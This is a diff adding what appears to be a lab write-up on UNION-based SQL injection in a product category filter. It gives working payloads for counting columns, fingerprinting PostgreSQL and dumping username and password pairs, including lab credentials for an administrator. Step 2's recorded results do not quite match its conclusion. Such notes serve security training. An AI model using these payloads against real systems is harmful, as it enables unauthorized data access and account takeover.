@@ -1,0 +1,39 @@
+SQL Injection in the product category filter
+
+Goal: retrieve all usernames and passwords and login as the administrator user.
+
+Analysis:
+---------
+
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--      /*The first column is the title*/
+' order by 2--      /*The second column is the text*/
+' order by 3--      !Error!
+-> The number of columns 2
+
+==========Step 2: Determine the data type of columns==========
+select a,b from products where category='Gifts
+
+' UNION select 'a', NULL--      !Error!
+' UNION select NULL, 'a'--      !Error!
+-> The second column is of data type string.
+
+==========Solution==========
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+====Find the version of the database====
+' UNION select NULL, @@version-- 
+-> error, It's not Microsoft or MySQL.
+
+' UNION select NULL, version()--
+-> PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+' UNION select NULL, username || '~' || password from users--
+wiener~6dwo4xsnqzuyrp0hkmm7
+administrator~wwc1unxsbm30gp79h7cc
+carlos~1n2j0n1d87dxo1k6rcf0
+
+/*If there were only one column that is output on the page or only one column that has data type of string, I will have to output each column on each own.*/
+
+script.py <url>
